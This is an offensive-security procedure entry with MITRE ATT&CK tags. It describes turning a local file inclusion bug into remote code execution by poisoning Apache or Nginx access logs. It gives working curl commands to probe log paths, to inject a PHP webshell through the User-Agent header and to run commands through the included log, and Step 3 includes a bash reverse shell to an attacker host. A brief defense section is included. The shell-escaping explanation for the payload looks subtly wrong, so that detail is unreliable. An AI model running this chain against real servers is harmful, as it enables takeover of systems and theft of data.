---
id: 050c1647-2da7-45bb-b8b0-8e3d01c1daca
name: LFI to RCE via Apache and Nginx Log Files
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:58.551110+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploitation for Client Execution|T1203 - Exploitation for
    Client Execution]]
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques:
  - '[[techniques/Command and Scripting Interpreter/T1059.004|PHP]]'
tags:
  - '[[tags/File Inclusion]]'
  - '[[tags/LFI]]'
  - '[[tags/RCE]]'
  - '[[tags/Web Application]]'
  - '[[tags/PHP]]'
  - '[[tags/Apache]]'
  - '[[tags/Nginx]]'
commands:
  - '[[commands/curl-lfi-test-log]]'
  - '[[commands/curl-inject-php-payload]]'
platforms:
  - Linux
  - Web
tools: []
validated: true
---

# LFI to RCE via Apache and Nginx Log Files

## Summary

This procedure exploits a Local File Inclusion (LFI) vulnerability in a web application to read server log files from Apache or Nginx, inject a PHP webshell payload into the access logs via crafted HTTP requests, and then include the tainted log file through LFI to achieve remote code execution (RCE). It is effective against PHP-based applications with insufficient input sanitization, allowing arbitrary command execution on the server.

## Description

Local File Inclusion vulnerabilities occur when user input is used to construct file paths without proper validation, enabling attackers to read arbitrary files on the server. In this technique, the attacker first uses LFI to confirm access to log files (e.g., /var/log/apache2/access.log). Next, they inject malicious PHP code into the log by sending HTTP requests with the payload in headers like User-Agent. When the web server logs the request, the PHP code is appended to the log file. Finally, the attacker includes the log file via LFI, triggering PHP execution of the injected code. This chain bypasses direct file upload restrictions and can lead to full system compromise. The target environment is typically a Linux server running Apache or Nginx with PHP, and the attack assumes the web application parameter (e.g., ?page=) is vulnerable to LFI.

## Requirements

1. A vulnerable web application with LFI (e.g., parameter like ?page= that includes files without sanitization).
2. Network access to the target web server (HTTP/HTTPS).
3. Knowledge of the web root and log file locations (common paths provided in instructions).
4. Tools like curl for sending requests (available on most systems).
5. Attacker-controlled listener or command execution target (e.g., for reverse shell).

## Defense

- Implement strict input validation and sanitization to prevent path traversal (e.g., whitelist allowed files, use basename() in PHP).
- Disable PHP execution in log directories by configuring Apache/Nginx (e.g., via .htaccess or server config: php_flag engine off).
- Monitor access logs for anomalous entries like PHP tags in User-Agent or other headers.
- Use web application firewalls (WAFs) to detect LFI patterns (e.g., ../ sequences).
- Rotate and secure log files with restricted permissions (e.g., chmod 640 /var/log/apache2/access.log).

## Objectives

1. Confirm LFI vulnerability and read server log files to understand the environment.
2. Inject a PHP webshell into the access log for persistent code execution.
3. Achieve RCE by including the tainted log file and executing system commands.
4. Escalate access for further post-exploitation (e.g., reverse shell).

## Instructions

### Step 1: Test LFI on Common Log Files

**Context**: Verify the LFI vulnerability by attempting to include common Apache, Nginx, and other server log files. This step confirms file read access and identifies the correct log path, which varies by distribution (e.g., /var/log/apache2/ on Ubuntu).

**Command** ([[commands/curl-lfi-test-log]]):
```bash
curl "http://$_TARGET_URL/index.php?page=$_LOG_PATH" -v
```

> Replace $_TARGET_URL with the vulnerable application's base URL (e.g., target.com) and $_LOG_PATH with paths like /var/log/apache2/access.log. Run multiple times for different paths to find the writable access log. Look for log entries in the response indicating successful inclusion.

**Expected Output**: The HTTP response body contains log file contents, such as recent access entries (e.g., IP addresses, timestamps, User-Agent strings). If successful, you may see your own probe requests logged.

### Step 2: Inject PHP Webshell Payload into Access Log

**Context**: Once the access log path is confirmed (e.g., /var/log/apache2/access.log), craft an HTTP request to inject PHP code into it. The payload uses a simple system() call to execute commands via a GET parameter (e.g., ?cmd=). This exploits the fact that access logs record headers like User-Agent.

**Command** ([[commands/curl-inject-php-payload]]):
```bash
curl "http://$_TARGET_URL/" -A "<?php system(\\$_GET['cmd']); ?>" -H "User-Agent: <?php system(\\$_GET['cmd']); ?>" -v
```

> The -A flag sets the User-Agent header with the PHP payload. The double backslashes escape for shell. Send this request to any endpoint on the target to ensure it's logged. Verify injection by re-including the log in Step 1; the payload should appear at the end of the log contents.

**Expected Output**: A 200 OK response from the server, and upon re-testing LFI inclusion, the log contents include the injected PHP string (e.g., User-Agent: <?php system($_GET['cmd']); ?>).

### Step 3: Execute Injected PHP Code via LFI

**Context**: Include the now-tainted log file through LFI and pass a command via the ?cmd parameter to trigger RCE. Start with benign commands like 'id' to verify, then escalate to reverse shells or file downloads.

**Command** ([[commands/curl-lfi-test-log]]):
```bash
curl "http://$_TARGET_URL/index.php?page=$_LOG_PATH&cmd=id" -v
```

> Use the confirmed $_LOG_PATH from Step 1. The ?cmd=id appends to the URL, triggering system('id') in the injected PHP. For more complex execution, use cmd=whoami or cmd=/bin/bash -i >& /dev/tcp/$_ATTACKER_IP/$_PORT 0>&1 for a reverse shell (set up a listener with nc -lvnp $_PORT first).

**Expected Output**: The response body shows the output of the command (e.g., uid=33(www-data) gid=33(www-data) for 'id'). No errors indicate successful RCE; the server executes as the web user (e.g., www-data).

**Success Indicators**:
- Log contents visible in LFI response.
- Injected PHP string appears in log after injection request.
- Command output (e.g., 'id' result) displayed in LFI inclusion response.
- No PHP parse errors; execution occurs silently.
